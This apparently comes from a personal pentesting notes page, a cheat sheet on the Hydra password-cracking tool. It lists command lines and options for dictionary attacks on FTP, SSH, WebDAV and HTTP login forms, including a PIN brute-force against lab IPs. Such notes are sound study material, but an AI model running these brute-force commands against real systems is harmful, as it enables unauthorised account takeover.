---
{"dg-publish":true,"permalink":"/notes/hydra/"}
---

- Crack pass with pass dic
- Supports [[FTP\|FTP]], [[POP3\|POP3]], [[IMAP\|IMAP]], [[SMTP\|SMTP]], [[Notes/SSH\|SSH]], [[SMB\|SMB]] and all methods related to HTTP.

**General use**
```shell
hydra -f -V -t 64 -l <username> -P /usr/share/wordlists/rockyou.txt <IP> <service>`
```

| Option                                                                                                                     | Description                                                   |
| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| `hydra -l username -P wordlist.txt server service`                                                                         | General command-line                                          |
| `hydra -l mark -P /usr/share/wordlists/rockyou.txt IP ftp`<br>`hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://IP` | E.g. ftp                                                      |
| `hydra -l <username> -P <wordlist> 10.10.181.239 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`        | Web form                                                      |
| `server`                                                                                                                   | hostname or IP address of the target server.                  |
| `service`                                                                                                                  | service which are trying to <br>launch the dictionary attack. |
| `-l`                                                                                                                       | Specifies the **single username** for login                   |
| `-L`                                                                                                                       | indicates a **list of users**                                 |
| `-p`                                                                                                                       | specifies the (SSH) **password** for login                    |
| `-P`                                                                                                                       | indicates a **list of passwords**                             |
| `-t 4`                                                                                                                     | sets the number of **threads** to spawn                       |
| `-s`                                                                                                                       | **port** number                                               |
| `-V`                                                                                                                       | Verbose for every attempt                                     |
| `-vV`                                                                                                                      | very verbose<br>shows login+pass for each attempt             |
| `-d`                                                                                                                       | Debugging                                                     |
| `-f`                                                                                                                       | stops Hydra after finding a working password                  |
| `http-post-form`                                                                                                           | the type of the form is POST                                  |
| `<path>`                                                                                                                   | the login page URL, for example, `login.php`                  |
| `<invalid_response>`                                                                                                       | part of the response when the login fails                     |
# Webdav
Brute force on the `webdav` subdir
```shell
hydra -L /usr/share/ -P <wordlist> IP_OR_DOMAIN http-get /webdav/
```
# Post Web Form
- Brute force web forms attack.
- You must know which type of request it is making; GET or POST methods are commonly used.
- You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

**General use**
Against 1 user
```shell
hydra -f -V -t 64 -l <username> -P /usr/share/wordlists/rockyou.txt TARGET_IP_OR_DOMAIN http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
```
Both dictionaries
```shell
hydra -f -V -t 64 -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt TARGET_IP_OR_DOMAIN http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
```
Only a password is required
```shell
hydra -l '' -P 3digits.txt -f -v 10.10.180.149 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```
![Pasted image 20231206174317.png|700](/img/user/attachments/Pasted%20image%2020231206174317.png)
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php` is the page where the PIN code is submitted
    - `pin=^PASS^` will replace `^PASS^` with values from the password list
    - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”

| Option           | Description                                                                              |
| ---------------- | ---------------------------------------------------------------------------------------- |
| `http-post-form` | Specifies the HTTP method to use                                                         |
| `-l ''`          | Indicates that the login name is blank as the security lock **only requires a password** |
| `/`              | The path of login subdirectory                                                           |
| `username`       | It's the form **field** where the username is entered                                    |
| `^USER^`         | The specified username(s) will **replace**                                               |
| `password`       | It's the form **field** where the password is entered                                    |
| `^PASS^`         | The provided passwords will be **replacing**                                             |
| `F=incorrect`    | **String** that appears in the server reply when the **login fails**                     |




---

